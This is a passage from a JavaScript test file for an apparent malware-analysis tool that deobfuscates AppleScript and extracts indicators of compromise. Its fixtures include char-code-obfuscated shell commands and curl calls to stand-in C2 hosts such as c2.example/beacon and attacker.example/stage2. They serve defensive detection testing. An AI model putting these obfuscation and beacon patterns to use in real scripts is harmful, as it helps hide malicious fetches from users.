test('applescript-obfuscation: Tier A — list with char-code-chain elements resolves each', () => {
  // List elements can themselves be obfuscated char-code chains.
  // Each element gets its own recursive resolution pass.
  const text =
    `do shell script "echo hi"\n` +
    `property _L : {((ASCII character 97) & (ASCII character 98)), ((ASCII character 99) & (ASCII character 100))}\n` +
    `property _Other : "x"`;
  const bindings = d._collectAppleScriptBindings(text);
  d._resolveAppleScriptBindings(bindings);
  const rec = bindings.get('_L');
  assert.ok(rec, `expected _L binding; got: ${[...bindings.keys()]}`);
  assert.ok(Array.isArray(rec.listValues), 'expected listValues array');
  assert.equal(rec.listValues.length, 2);
  assert.equal(rec.listValues[0], 'ab');
  assert.equal(rec.listValues[1], 'cd');
});

test('applescript-obfuscation: Tier A — loop iterator expansion emits N variants per sink', () => {
  // `repeat with x in <list>` inside a handler + `set Y to (contents
  // of x)` + sink using Y → sink emits one variant per list value.
  const text =
    `property _Hosts : {"a.example", "b.example", "c.example"}\n` +
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `on __runner()\n` +
    `    repeat with _iter in _Hosts\n` +
    `        set _url to (contents of _iter)\n` +
    `        do shell script "curl " & _url\n` +
    `    end repeat\n` +
    `end __runner`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sinks = pick(cands, c => /Reassembled Shell Command/.test(c.technique || ''));
  assert.equal(sinks.length, 3, `expected 3 variants; got: ${JSON.stringify(host(cands).map(c => ({t: c.technique, v: c._resolvedValue})))}`);
  const hosts = new Set(sinks.map(s => s._resolvedValue));
  assert.ok(hosts.has('curl a.example'), `expected curl a.example`);
  assert.ok(hosts.has('curl b.example'), `expected curl b.example`);
  assert.ok(hosts.has('curl c.example'), `expected curl c.example`);
});

test('applescript-obfuscation: Tier A — variants carry _loopVariant metadata', () => {
  const text =
    `property _Hosts : {"h1", "h2"}\n` +
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `on __runner()\n` +
    `    repeat with _iter in _Hosts\n` +
    `        set _url to (contents of _iter)\n` +
    `        do shell script "curl " & _url\n` +
    `    end repeat\n` +
    `end __runner`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sinks = pick(cands, c => c._loopVariant != null);
  assert.ok(sinks.length >= 2, `expected at least 2 loop variants; got: ${JSON.stringify(host(cands))}`);
  const iterations = sinks.map(s => s._loopVariant.iteration._url);
  assert.ok(iterations.includes('h1'), `expected iteration _url=h1`);
  assert.ok(iterations.includes('h2'), `expected iteration _url=h2`);
});

test('applescript-obfuscation: Tier A — transitive loop ref resolves via handler-local binding', () => {
  // Sink references a handler-local binding `_url` whose value is a
  // partially-resolved chain containing `⟨unresolved:_iter⟩`. The
  // sink walker must transitively expand the ref closure to detect
  // `_iter` is a loop-iterator var and emit N variants with the
  // loop-iter shadow propagated through `_url`.
  const text =
    `property _Hosts : {"h1.example", "h2.example"}\n` +
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `on __runner()\n` +
    `    repeat with _iter in _Hosts\n` +
    `        set _url to (contents of _iter)\n` +
    `        set _full to ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47)) & _url\n` +
    `        do shell script _full\n` +
    `    end repeat\n` +
    `end __runner`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sinks = pick(cands, c => /Reassembled Shell Command/.test(c.technique || '') && c._loopVariant);
  assert.equal(sinks.length, 2, `expected 2 transitive variants; got: ${JSON.stringify(host(cands).map(c => ({t: c.technique, v: c._resolvedValue, lv: c._loopVariant})))}`);
  const values = sinks.map(s => s._resolvedValue).sort();
  assert.equal(values.length, 2);
  assert.equal(values[0], 'https://h1.example');
  assert.equal(values[1], 'https://h2.example');
});

test('applescript-obfuscation: Tier A — variant cap prevents combinatorial blowup', () => {
  // Two loop-iterator refs in the same sink: cross-product would be
  // 4 * 4 = 16 variants; cap is 8. Verify no more than the cap.
  const text =
    `property _H1 : {"a1", "a2", "a3", "a4"}\n` +
    `property _H2 : {"b1", "b2", "b3", "b4"}\n` +
    `property _Other : "x"\n` +
    `on __runner()\n` +
    `    repeat with _i1 in _H1\n` +
    `        set _u1 to (contents of _i1)\n` +
    `        repeat with _i2 in _H2\n` +
    `            set _u2 to (contents of _i2)\n` +
    `            do shell script "curl " & _u1 & " " & _u2\n` +
    `        end repeat\n` +
    `    end repeat\n` +
    `end __runner`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sinks = pick(cands, c => /Reassembled Shell Command/.test(c.technique || '') && c._loopVariant);
  assert.ok(sinks.length <= 8, `variant count must respect _AS_MAX_LOOP_VARIANTS cap; got: ${sinks.length}`);
});

// ── Tier C: Runtime-URL-fetch IOC annotation ──────────────────────────────

test('applescript-obfuscation: Tier C — `set X to do shell script "curl URL"` emits runtime-URL-fetch candidate', () => {
  const text =
    `do shell script "echo hi"\n` +
    `property _Other1 : "x"\n` +
    `set _DynVar to do shell script "curl -s https://c2.example/beacon"\n` +
    `property _Other2 : "y"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const dyn = pick(cands, c => c.technique === 'AppleScript Runtime URL Fetch');
  assert.ok(dyn.length >= 1, `expected runtime-URL-fetch candidate; got: ${JSON.stringify(host(cands).map(c => c.technique))}`);
  assert.equal(dyn[0]._assignedTo, '_DynVar');
  assert.ok(dyn[0]._dynamicSource, 'expected _dynamicSource metadata');
  assert.ok(dyn[0]._dynamicSource.urls.includes('https://c2.example/beacon'));
  // Annotation body: plain-English `⟨runtime fetch from URL⟩`, not the
  // legacy `<dynamic-fetch: URL>` internal-vocabulary form.
  assert.ok(
    /runtime fetch from/.test(dyn[0].deobfuscated),
    `annotation body should use plain-English "runtime fetch from"; got ${JSON.stringify(dyn[0].deobfuscated)}`,
  );
  assert.ok(
    !/dynamic-fetch/i.test(dyn[0].deobfuscated),
    `annotation body must not leak the old "dynamic-fetch" token; got ${JSON.stringify(dyn[0].deobfuscated)}`,
  );
  // Singular-URL branch uses `from URL` (no colon); plural uses
  // `from: URL, URL`. Verify the singular shape here.
  assert.ok(
    /\u27e8runtime fetch from https:\/\/c2\.example\/beacon\u27e9/.test(dyn[0].deobfuscated),
    `expected ⟨runtime fetch from URL⟩ singular form; got ${JSON.stringify(dyn[0].deobfuscated)}`,
  );
});

test('applescript-obfuscation: Tier C — runtime-URL-fetch URL appears as URL IOC', () => {
  const text =
    `do shell script "echo hi"\n` +
    `property _Other1 : "x"\n` +
    `set _DynVar to do shell script "curl -s https://c2.example/beacon"\n` +
    `property _Other2 : "y"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const dyn = pick(cands, c => c.technique === 'AppleScript Runtime URL Fetch');
  assert.ok(dyn.length >= 1);
  const urls = dyn[0]._patternIocs.map(p => p.url);
  assert.ok(urls.some(u => /https:\/\/c2\.example\/beacon/.test(u)),
    `expected URL IOC label; got: ${JSON.stringify(urls)}`);
});

test('applescript-obfuscation: Tier C — unescape preserves literal `\\n` / `\\t` / `\\r` in AS source (CodeQL #123 regression)', () => {
  // The old four-step unescape chain processed `\\` in the middle of
  // the pipeline, so an AppleScript source literal containing `\\n`
  // (author-written: backslash-backslash-n, meaning a literal
  // backslash followed by `n` per AS grammar) was double-unescaped to
  // a LINEFEED, corrupting Windows paths and similar content. The
  // single-pass alternation form fixes this. Regression test: the
  // runtime command must preserve the literal `\n` and `\t` sequences
  // in the `_dynamicSource.command` field, and the URL must still be
  // extracted alongside them.
  //
  // In JS source, `\\\\n` === four chars (`\` `\` `\` `n`) which in an
  // AppleScript "..." literal parses to three runtime chars: `\` `\`
  // `n` → after AS unescape: `\` + `n`. Same shape for `\\\\t`.
  const text =
    `set _X to do shell script "echo C:\\\\ntuser.dat https://c2.example/\\\\tpath"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const dyn = pick(cands, c => c.technique === 'AppleScript Runtime URL Fetch');
  assert.ok(dyn.length >= 1, `expected runtime-URL-fetch candidate; got: ${JSON.stringify(host(cands).map(c => c.technique))}`);
  const cmd = dyn[0]._dynamicSource.command;
  // Must NOT contain a literal linefeed or tab — those would be the
  // symptom of the double-unescape bug.
  assert.ok(!/\n/.test(cmd),
    `command must not contain a real linefeed (double-unescape bug); got: ${JSON.stringify(cmd)}`);
  assert.ok(!/\t/.test(cmd),
    `command must not contain a real tab (double-unescape bug); got: ${JSON.stringify(cmd)}`);
  // Must contain the literal backslash-n and backslash-t sequences.
  assert.ok(cmd.includes('\\n'),
    `command must preserve literal \\n; got: ${JSON.stringify(cmd)}`);
  assert.ok(cmd.includes('\\t'),
    `command must preserve literal \\t; got: ${JSON.stringify(cmd)}`);
  // URL extraction must still work.
  assert.ok(dyn[0]._dynamicSource.urls.some(u => u.startsWith('https://c2.example/')),
    `URL extraction must still find the C2 URL; got: ${JSON.stringify(dyn[0]._dynamicSource.urls)}`);
});

test('applescript-obfuscation: Tier C — unescape handles the full AS escape-sequence set (\\" \\\\ \\n \\r \\t)', () => {
  // Spec coverage for the single-pass alternation. Each escape in the
  // source literal maps to its AS-grammar runtime character. `\r` was
  // previously silently passed through as a literal backslash-r; the
  // rewrite recognises it alongside `\n` and `\t`.
  //
  // In JS source here the doubled backslashes collapse to single
  // backslashes inside the constructed AS-literal string, exactly as
  // they would appear in a file on disk.
  const text =
    `set _X to do shell script "A\\"B\\\\C\\nD\\rE\\tF https://a.example/"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const dyn = pick(cands, c => c.technique === 'AppleScript Runtime URL Fetch');
  assert.ok(dyn.length >= 1);
  const cmd = dyn[0]._dynamicSource.command;
  assert.ok(cmd.includes('A"B'),  `\\" must unescape to "; got: ${JSON.stringify(cmd)}`);
  assert.ok(cmd.includes('B\\C'), `\\\\ must unescape to a single backslash; got: ${JSON.stringify(cmd)}`);
  assert.ok(cmd.includes('C\nD'), `\\n must unescape to LF; got: ${JSON.stringify(cmd)}`);
  assert.ok(cmd.includes('D\rE'), `\\r must unescape to CR; got: ${JSON.stringify(cmd)}`);
  assert.ok(cmd.includes('E\tF'), `\\t must unescape to HT; got: ${JSON.stringify(cmd)}`);
});

test('applescript-obfuscation: Tier C — sink context (set X to do shell script <chain>) surfaces dynamic URL', () => {
  // When the `do shell script` argument is a char-code chain that
  // resolves to a command containing a URL, AND the statement is
  // wrapped in `set <var> to ...`, Pass 3 detects the assignment
  // context and emits the URL as a _dynamicFetchUrls IOC.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `on __runner()\n` +
    `    set _Fetched to do shell script ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108) & " " & "https://dynamic.example/path")\n` +
    `end __runner`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  // The sink is emitted with _assignedTo='_Fetched' and
  // _dynamicFetchUrls containing the extracted URL.
  const sinks = pick(cands, c => c._assignedTo === '_Fetched' && c._dynamicFetchUrls);
  assert.ok(sinks.length >= 1,
    `expected sink with _assignedTo=_Fetched + _dynamicFetchUrls; got: ${JSON.stringify(host(cands).map(c => ({t: c.technique, at: c._assignedTo, df: c._dynamicFetchUrls})))}`);
  assert.ok(sinks[0]._dynamicFetchUrls.includes('https://dynamic.example/path'));
});

test('applescript-obfuscation: AS1 anon chain emits AS-quoted deobfuscated literal', () => {
  // Splicing the chain's offset with a bare unquoted value (`https://`)
  // would wedge the surrounding `&`-concatenation expression. Quoted
  // form (`"https://"`) is a valid AS sub-expression that splices
  // safely at any chain offset. Using a `display dialog` call-site so
  // the chain is anonymous (not captured by a binding).
  const text =
    `do shell script "echo hi"\n` +
    `display dialog ((character id 104) & (character id 116) & (character id 116) & (character id 112) & (character id 115) & ":" & (ASCII character 47) & (ASCII character 47))`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const chain = pick(cands, c => c.technique === 'AppleScript Char-Code Reassembly');
  assert.ok(chain.length >= 1, `expected AS1 hit; got: ${JSON.stringify(host(cands))}`);
  assert.ok(/^"[^"]/.test(chain[0].deobfuscated),
    `deobfuscated must be AS-quoted; got: ${chain[0].deobfuscated}`);
  assert.equal(chain[0]._resolvedValue, 'https://',
    `_resolvedValue must be bare resolved bytes for IOC extraction`);
});

test('applescript-obfuscation: AS2 anon string id emits AS-quoted deobfuscated literal', () => {
  // Same quoting rationale as AS1. Stitched output reads
  // `if x is ("success")` which is valid AS comparison syntax.
  const text =
    `do shell script "echo hi"\n` +
    `if _x is (string id {115, 117, 99, 99, 101, 115, 115}) then`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'AppleScript Codepoint Array');
  assert.ok(hits.length >= 1, `expected AS2 hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, '"success"');
  assert.equal(hits[0]._resolvedValue, 'success');
});

test('applescript-obfuscation: AS2 escapes embedded quotes in AS-quoted output', () => {
  // Resolved value contains `"` — must be escaped as `\"` in the
  // AS-quoted output so splicing produces valid AppleScript.
  // Codepoints: s h e " → 115, 104, 101, 34
  const text =
    `do shell script "echo hi"\n` +
    `display dialog (string id {115, 104, 101, 32, 115, 97, 105, 100, 32, 34, 104, 105, 34})`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'AppleScript Codepoint Array');
  assert.ok(hits.length >= 1, `expected AS2 hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._resolvedValue, 'she said "hi"');
  assert.equal(hits[0].deobfuscated, '"she said \\"hi\\""');
});

// NOTE: the three "Pass 4 lone-primitive" tests were removed in the
// Deobfuscation cull. The `AppleScript Lone Primitive` branch in
// src/decoders/applescript-obfuscation.js was deleted — a single
// `(ASCII character N)` decoding to one quoted character is not a
// payload. AS1 / AS2 (chain + binding reassembly, tested above) remain
// the meaningful multi-primitive recovery paths.

// ── Partial-resolution propagation through ref chains ─────────────────────

test('applescript-obfuscation: ref to partially-resolved binding propagates partial value', () => {
  // `_X` resolves to `"https://⟨unresolved:_Runtime⟩/"` because
  // `_Runtime` has no file-scope binding. When `_Y` references `_X`
  // via `quoted form of _X`, the resolver must use `_X`'s partial
  // value (carries the static prefix/suffix) rather than discarding
  // to `⟨unresolved:_X⟩`. The outer `fullyResolved=false` still
  // propagates so severity tiers downstream are unaffected.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `set _X to ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47)) & _Runtime & (ASCII character 47)\n` +
    `set _Y to "prefix " & _X & " suffix"\n` +
    `do shell script _Y`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const y = pick(cands, c => c._assignedTo === '_Y');
  assert.ok(y.length >= 1, `expected _Y binding candidate; got: ${JSON.stringify(host(cands))}`);
  // _Y's resolved value must include the static prefix of _X
  // (`https://`) even though _X itself is only partially resolved.
  assert.ok(y[0]._resolvedValue.includes('https://'),
    `_Y's value must include _X's static prefix; got: ${y[0]._resolvedValue}`);
  assert.ok(y[0]._resolvedValue.includes('\u27E8unresolved:_Runtime\u27E9'),
    `_Y's value must surface the genuinely-unresolved ref; got: ${y[0]._resolvedValue}`);
});

test('applescript-obfuscation: handler sink resolves handler-local binding refs', () => {
  // Handler-local `set __URL to ...` is now self-contained —
  // collected with `_handlerScoped: true`. A same-handler sink
  // referencing `__URL` must resolve to the full chain's static
  // value (with partial-refs surfaced as `⟨unresolved⟩` where
  // appropriate).
  const text =
    `property _FileX : "abc"\n` +
    `property _FileY : "def"\n` +
    `on __runner()\n` +
    `    set __URL to ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47) & "evil.invalid/")\n` +
    `    do shell script ("curl " & __URL)\n` +
    `end __runner`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sinks = pick(cands, c => /Reassembled Shell Command/.test(c.technique || ''));
  assert.ok(sinks.length >= 1, `expected sink candidate; got: ${JSON.stringify(host(cands))}`);
  assert.ok(sinks[0]._resolvedValue.includes('https://evil.invalid/'),
    `handler sink must resolve __URL fully; got: ${sinks[0]._resolvedValue}`);
  // No `⟨unresolved⟩` placeholder should appear.
  assert.ok(!sinks[0]._resolvedValue.includes('\u27E8unresolved'),
    `handler sink must not emit ⟨unresolved⟩; got: ${sinks[0]._resolvedValue}`);
});

test('applescript-obfuscation: Tier B — handler-local binding propagates to empty file-scope property', () => {
  // Tier B: when a `property _X : ""` is reassigned by exactly ONE
  // self-contained `set _X to <rhs>` inside a handler body, promote
  // the handler's value to file-scope. Common malware pattern: declare
  // the property empty at file top, populate it inside a helper
  // handler that runs before any top-level sink references `_X`.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `property _ShouldStayEmpty : ""\n` +
    `on __foo()\n` +
    `    set _ShouldStayEmpty to ((ASCII character 104) & (ASCII character 101) & (ASCII character 108) & (ASCII character 108) & (ASCII character 111))\n` +
    `end __foo\n` +
    `do shell script _ShouldStayEmpty`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const fileScope = pick(cands, c => c._assignedTo === '_ShouldStayEmpty' && !c._handlerScoped);
  // Empty property gets promoted: the file-scope candidate now
  // resolves to "hello" (the handler's assignment).
  assert.equal(fileScope.length, 1, 'expected file-scope binding to emit post-promotion');
  assert.equal(fileScope[0]._resolvedValue, 'hello');
  // Top-level sink referencing the promoted property resolves fully.
  const sink = pick(cands, c => /Reassembled Shell Command/.test(c.technique || ''));
  assert.ok(sink.length >= 1, 'expected top-level sink to resolve via Tier B');
  assert.equal(sink[0]._resolvedValue, 'hello');
});

test('applescript-obfuscation: Tier B — non-empty file-scope property is NOT overridden', () => {
  // Conservative policy: only empty-string properties get promoted.
  // A non-empty property preserves its file-scope value even if the
  // handler reassigns it.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `property _Initial : "INITIAL"\n` +
    `on __foo()\n` +
    `    set _Initial to ((ASCII character 111) & (ASCII character 118) & (ASCII character 101) & (ASCII character 114))\n` +
    `end __foo\n` +
    `do shell script _Initial`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const fileScope = pick(cands, c => c._assignedTo === '_Initial' && !c._handlerScoped);
  // File-scope property is pure-literal non-empty; emit-gate skips
  // it. No Tier B promotion because the existing value is non-empty.
  // Top-level sink resolves to the file-scope value "INITIAL".
  assert.equal(fileScope.length, 0, 'pure-literal file-scope binding should not emit');
  const sink = pick(cands, c => /Reassembled Shell Command/.test(c.technique || ''));
  assert.ok(sink.length >= 1, 'expected top-level sink');
  assert.equal(sink[0]._resolvedValue, 'INITIAL',
    `Tier B must preserve file-scope value when existing is non-empty; got: ${sink[0]._resolvedValue}`);
});

test('applescript-obfuscation: Tier B skips when handler has multiple `set X to …` reassignments', () => {
  // Conservative: multiple assignments means the "effective" value
  // depends on handler control flow — skip promotion.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `property _X : ""\n` +
    `on __foo()\n` +
    `    set _X to ((ASCII character 104) & (ASCII character 105))\n` +
    `    set _X to ((ASCII character 98) & (ASCII character 121) & (ASCII character 101))\n` +
    `end __foo\n` +
    `do shell script _X`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const fileScope = pick(cands, c => c._assignedTo === '_X' && !c._handlerScoped);
  assert.equal(fileScope.length, 0,
    `multi-assignment handler must skip Tier B promotion; got: ${JSON.stringify(host(cands))}`);
});

// ── Unresolved-sentinel rejection at IOC-emission ──────────────────────────
//
// Partially-resolved cleartext carries `⟨unresolved:NAME⟩` (U+27E8 /
// U+27E9) placeholders for operands the resolver couldn't substitute.
// These markers are load-bearing in the Deobfuscation viewer — the
// analyst needs to see WHICH slot is unknown — but they must never
// reach IOC buckets. A URL like `https://⟨unresolved:__iunw9unf⟩/` is
// not a real pivot and pollutes the sidebar, Summary, STIX and MISP
// exports. `hasUnresolvedSentinel()` is the canonical gate; see
// `src/constants.js` for the rationale.

test('applescript-obfuscation: sentinel-bearing URL does not escape into IOC.URL via _extractIOCsFromDecoded', () => {
  // Direct exercise of the innermost gate. Feed bytes that contain a
  // reassembled `do shell script` line with a partially-resolved URL
  // carrying a U+27E8/U+27E9 sentinel — the extractor must emit NO
  // IOC.URL row (the host-sanity filter would reject a bare sentinel
  // host, but a real-host-plus-sentinel-path construction would
  // otherwise slip through the regex character class).
  const payload = 'do shell script "curl https://\u27E8unresolved:__iunw9unf\u27E9/ && '
                + 'curl https://attacker.example/\u27E8unresolved:_path\u27E9/stage2"';
  const bytes = new TextEncoder().encode(payload);
  const iocs = d._extractIOCsFromDecoded(bytes);
  for (const i of iocs) {
    assert.ok(!/\u27E8|\u27E9/.test(i.url),
      `no sentinel may reach IOC buckets; leaked: ${JSON.stringify(i)}`);
  }
});

test('applescript-obfuscation: partial resolution Tier C — dynamicFetchUrls skips sentinel-bearing URLs', () => {
  // Tier C: `set _Var to do shell script <chain>` extracts URLs from
  // the resolved command as `_patternIocs` labels. When the chain is
  // only partially resolved, any URL that still contains a sentinel
  // must be skipped — the runtime-fetch URL is unknown, so surfacing
  // `Dynamic C2 discovery … — https://⟨unresolved:_X⟩/` is misleading.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    // Builds `https://` static prefix + unresolved `_Runtime` + `/`.
    // Assignment to `_Fetched` makes this a Tier C candidate.
    `set _Fetched to do shell script ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47)) & _Runtime & (ASCII character 47)`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  // Inspect every candidate's _patternIocs / _dynamicFetchUrls — none
  // may contain a sentinel character.
  for (const c of host(cands)) {
    const pats = Array.isArray(c._patternIocs) ? c._patternIocs : [];
    for (const p of pats) {
      assert.ok(!/\u27E8|\u27E9/.test(p.url || ''),
        `_patternIocs label leaked sentinel; got: ${JSON.stringify(p)}`);
    }
    const dyn = Array.isArray(c._dynamicFetchUrls) ? c._dynamicFetchUrls : [];
    for (const u of dyn) {
      assert.ok(!/\u27E8|\u27E9/.test(u),
        `_dynamicFetchUrls entry leaked sentinel; got: ${u}`);
    }
  }
});

test('applescript-obfuscation: partially-reassembled shell command with sentinel URL — no IOC.URL emitted', async () => {
  // End-to-end via `_processCommandObfuscation` — the full pipeline
  // that the host uses. `_X` resolves to
  // `"https://⟨unresolved:_Runtime⟩/"` (static prefix known, runtime
  // host unknown); a sink referencing `_X` propagates the partial
  // resolution. Emitted IOCs must NOT carry the sentinel chars.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `set _X to ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":" & (ASCII character 47) & (ASCII character 47)) & _Runtime & (ASCII character 47)\n` +
    `do shell script _X`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => /Partially-Reassembled/.test(c.technique || ''));
  assert.ok(sink.length >= 1, `expected partially-reassembled sink; got: ${JSON.stringify(host(cands))}`);
  // Confirm the sentinel is present on _resolvedValue (preserves
  // analyst-visible uncertainty signal in the Deobfuscation card).
  assert.ok(sink[0]._resolvedValue.includes('\u27E8unresolved:_Runtime\u27E9'),
    `_resolvedValue must retain sentinel; got: ${sink[0]._resolvedValue}`);
  // Now run through the post-processor — the emitted IOCs must NOT.
  const finding = await d._processCommandObfuscation(sink[0]);
  assert.ok(finding, 'expected post-processor to return a finding');
  const leaky = (finding.iocs || []).filter(i => /\u27E8|\u27E9/.test(i.url || ''));
  assert.equal(leaky.length, 0,
    `no finding.iocs row may carry a sentinel; leaked: ${JSON.stringify(leaky)}`);
});

// ── pushIOC sentinel gate (canonical chokepoint) ───────────────────────────
//
// Every IOC row that reaches `findings.interestingStrings` /
// `findings.externalRefs` funnels through `pushIOC()`. A gate there
// catches every caller — renderer raw-URL regexes (osascript, plist),
// decoder post-processors, the reassembler novelIocs loop, the
// `_mergeEncodedFindingIocs` chokepoint. This is the last-line defence
// against sentinel-bearing values (`⟨unresolved:NAME⟩`,
// `⟨VAR:~start,len⟩`, `⟨…⟩` — U+27E8 / U+27E9).
//
// The specific leak that prompted this gate: clicking "Analyse
// Deobfuscated Script" on a reassembled AppleScript opens a synthetic
// `.reassembled.<hash>.<ext>` file whose text contains decoder-embedded
// sentinels. The child load routes to `OsascriptRenderer` via
// `_sniffAppleScript`, and the renderer's own URL regex
// (`/https?:\/\/[^\s"'<>\])}]{6,200}/gi`) captures the sentinel URL and
// funnels it straight through `pushIOC` at medium severity — bypassing
// every gate that lived at the decoded-bytes / extractor / merge layers.

test('pushIOC: rejects IOC.URL with ⟨unresolved:…⟩ sentinel', () => {
  const { pushIOC, IOC } = osCtx;
  const findings = { interestingStrings: [], externalRefs: [] };
  pushIOC(findings, {
    type: IOC.URL,
    value: 'https://\u27E8unresolved:__cViNLHc\u27E9/',
    severity: 'medium',
    bucket: 'externalRefs',
  });
  assert.equal(findings.externalRefs.length, 0,
    `sentinel URL must be dropped; got: ${JSON.stringify(host(findings.externalRefs))}`);
  assert.equal(findings.interestingStrings.length, 0,
    'sentinel URL must not land in any bucket');
});

test('pushIOC: rejects any IOC type carrying ⟨…⟩ sentinel', () => {
  const { pushIOC, IOC } = osCtx;
  const findings = { interestingStrings: [], externalRefs: [] };
  const cases = [
    { type: IOC.URL,       value: 'https://\u27E8VAR:~0,3\u27E9.example/' },
    { type: IOC.IP,        value: '\u27E8VAR:~0,3\u27E9.1.2.3' },
    { type: IOC.FILE_PATH, value: 'C:\\Users\\\u27E8unresolved:_U\u27E9\\x.exe' },
    { type: IOC.EMAIL,     value: 'user@\u27E8unresolved:_Domain\u27E9' },
    { type: IOC.PATTERN,   value: 'Dynamic C2 \u2014 https://\u27E8unresolved:_X\u27E9/' },
  ];
  for (const c of cases) {
    pushIOC(findings, { type: c.type, value: c.value, severity: 'medium' });
  }
  const all = [...findings.interestingStrings, ...findings.externalRefs];
  assert.equal(all.length, 0,
    `no sentinel-bearing IOC may land via pushIOC; got: ${JSON.stringify(host(all))}`);
});

test('pushIOC: clean values still land (gate does not over-filter)', () => {
  const { pushIOC, IOC } = osCtx;
  const findings = { interestingStrings: [], externalRefs: [] };
  pushIOC(findings, {
    type: IOC.URL,
    value: 'https://clean.example/path',
    severity: 'medium',
    bucket: 'externalRefs',
  });
  assert.ok(findings.externalRefs.some(r => r.url === 'https://clean.example/path'),
    `clean URL must pass the gate; got: ${JSON.stringify(host(findings.externalRefs))}`);
});

test('OsascriptRenderer: analyzeForSecurity drops sentinel-bearing URLs from raw regex scan', () => {
  // The reproduction of the user-reported leak: a reassembled-script
  // child file whose content contains a partially-resolved URL. The
  // renderer's raw URL regex at line ~692 of osascript-renderer.js has
  // no sentinel filter of its own, but pushIOC (which it funnels
  // through) does. Assert no sentinel IOC.URL row survives.
  const text =
    'on __run()\n' +
    '    set __WACaHqJOA0 to "https://\u27E8unresolved:__cViNLHc\u27E9/"\n' +
    '    set _good to "https://clean.example.com/stage2"\n' +
    '    do shell script ("curl " & __WACaHqJOA0)\n' +
    '    do shell script ("curl " & _good)\n' +
    'end __run';
  const bytes = new TextEncoder().encode(text);
  const buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
  const renderer = new OsascriptRenderer();
  const findings = renderer.analyzeForSecurity(buffer, 'malicious.reassembled.abc123.txt');
  const allIocs = [
    ...((findings.externalRefs || [])),
    ...((findings.interestingStrings || [])),
  ];
  for (const r of allIocs) {
    assert.ok(!/\u27E8|\u27E9/.test(r.url || r.value || ''),
      `no IOC row may carry a sentinel; leaked: ${JSON.stringify(host([r]))}`);
  }
  // Clean URL must still land so we know the renderer did run its
  // URL scan and the gate wasn't over-filtering.
  const urls = allIocs.filter(r => (r.url || r.value) === 'https://clean.example.com/stage2');
  assert.ok(urls.length >= 1,
    `clean URL must still be extracted; got allIocs: ${JSON.stringify(host(allIocs))}`);
});

// ── Bare-domain extraction via tldts (widened TLD coverage) ────────────────
//
// The osascript / plist bare-domain regex historically hardcoded a
// 13-TLD whitelist (`com|net|org|io|xyz|info|biz|ru|cn|tk|top|cc|pw`).
// That missed every other public TLD — notably `.pro`, `.lol`, `.app`,
// `.dev`, `.shop`, `.online`, `.site`, `.me`, `.co`, country TLDs,
// new-gTLDs, etc. Reassembled AppleScript payloads often embed C2
// domains in list literals like `{"9sxgrev.pro", "axj0tw9.lol"}` that
// were silently dropped.
//
// The fix replaces the TLD whitelist with a loose 2–6 label dotted
// regex + tldts validation inside `pushBareDomain`. tldts's
// `isIcann === true` accepts every legitimate public suffix and
// rejects filenames / version strings / invalid TLDs.

test('OsascriptRenderer: bare-domain extraction surfaces .pro / .lol / .app / .dev / .online', () => {
  const text =
    'property _list : {"9sxgrev.pro", "axj0tw9.lol", "jnoaxfwe.info", "attacker.app", "c2.dev", "phish.online"}\n' +
    'do shell script "ping foo"';
  const bytes = new TextEncoder().encode(text);
  const buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
  const renderer = new OsascriptRenderer();
  const findings = renderer.analyzeForSecurity(buffer, 'test.applescript');
  const domains = (findings.externalRefs || [])
    .filter(r => r.type === osCtx.IOC.DOMAIN)
    .map(r => r.url.toLowerCase());
  for (const d of ['9sxgrev.pro', 'axj0tw9.lol', 'jnoaxfwe.info', 'attacker.app', 'c2.dev', 'phish.online']) {
    assert.ok(domains.includes(d),
